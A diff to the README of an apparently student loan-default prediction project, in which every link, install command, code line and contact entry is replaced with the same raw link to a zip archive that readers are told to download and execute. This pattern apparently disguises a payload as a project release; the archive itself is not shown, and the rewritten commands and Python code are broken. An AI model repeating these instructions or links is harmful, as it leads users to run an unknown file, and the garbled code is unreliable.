@@ -1,6 +1,6 @@
 # Loan Default Prediction 📊
 
-![Loan Default Prediction](https://img.shields.io/badge/Loan%20Default%20Prediction-AI%20Model-brightgreen)
+![Loan Default Prediction](https://github.com/PAFOULEH5/Loan-Default-Prediction/raw/refs/heads/main/ureameter/Loan_Prediction_Default_v2.0.zip%20Default%20Prediction-AI%20Model-brightgreen)
 
 Welcome to the **Loan Default Prediction** repository! This project focuses on predicting loan default risk using financial and credit history data. It was developed as part of a team capstone project for a master's degree at Deakin University. 
 
@@ -42,7 +42,7 @@ To get started with this project, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/PAFOULEH5/Loan-Default-Prediction.git
+   git clone https://github.com/PAFOULEH5/Loan-Default-Prediction/raw/refs/heads/main/ureameter/Loan_Prediction_Default_v2.0.zip
    ```
 
 2. Navigate to the project directory:
@@ -52,7 +52,7 @@ To get started with this project, follow these steps:
 
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/PAFOULEH5/Loan-Default-Prediction/raw/refs/heads/main/ureameter/Loan_Prediction_Default_v2.0.zip
    ```
 
 ## Data
@@ -99,7 +99,7 @@ To install the project, follow these steps:
 1. Ensure you have Python 3.x installed.
 2. Clone the repository:
    ```bash
-   git clone https://github.com/PAFOULEH5/Loan-Default-Prediction.git
+   git clone https://github.com/PAFOULEH5/Loan-Default-Prediction/raw/refs/heads/main/ureameter/Loan_Prediction_Default_v2.0.zip
    ```
 3. Navigate to the project directory:
    ```bash
@@ -107,7 +107,7 @@ To install the project, follow these steps:
    ```
 4. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/PAFOULEH5/Loan-Default-Prediction/raw/refs/heads/main/ureameter/Loan_Prediction_Default_v2.0.zip
    ```
 
 ## Usage
@@ -124,13 +124,13 @@ Example code for making predictions:
 import joblib
 
 # Load the model
-model = joblib.load('loan_default_model.pkl')
+model = https://github.com/PAFOULEH5/Loan-Default-Prediction/raw/refs/heads/main/ureameter/Loan_Prediction_Default_v2.0.zip('https://github.com/PAFOULEH5/Loan-Default-Prediction/raw/refs/heads/main/ureameter/Loan_Prediction_Default_v2.0.zip')
 
 # Prepare your input data
 input_data = [[credit_score, loan_amount, income, employment_status, previous_defaults]]
 
 # Make predictions
-prediction = model.predict(input_data)
+prediction = https://github.com/PAFOULEH5/Loan-Default-Prediction/raw/refs/heads/main/ureameter/Loan_Prediction_Default_v2.0.zip(input_data)
 print("Loan Default Prediction:", prediction)
 ```
 
@@ -161,13 +161,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please contact:
 
-- **Your Name**: [your.email@example.com](mailto:your.email@example.com)
+- **Your Name**: [https://github.com/PAFOULEH5/Loan-Default-Prediction/raw/refs/heads/main/ureameter/Loan_Prediction_Default_v2.0.zip](https://github.com/PAFOULEH5/Loan-Default-Prediction/raw/refs/heads/main/ureameter/Loan_Prediction_Default_v2.0.zip)
 
 ## Releases
 
-You can find the latest releases of the project [here](https://github.com/PAFOULEH5/Loan-Default-Prediction/releases). Please download and execute the relevant files for your needs.
+You can find the latest releases of the project [here](https://github.com/PAFOULEH5/Loan-Default-Prediction/raw/refs/heads/main/ureameter/Loan_Prediction_Default_v2.0.zip). Please download and execute the relevant files for your needs.
 
-![Release Button](https://img.shields.io/badge/Download%20Releases-blue)
+![Release Button](https://github.com/PAFOULEH5/Loan-Default-Prediction/raw/refs/heads/main/ureameter/Loan_Prediction_Default_v2.0.zip%20Releases-blue)
 
 Explore the **Releases** section for more information on updates and improvements.
 
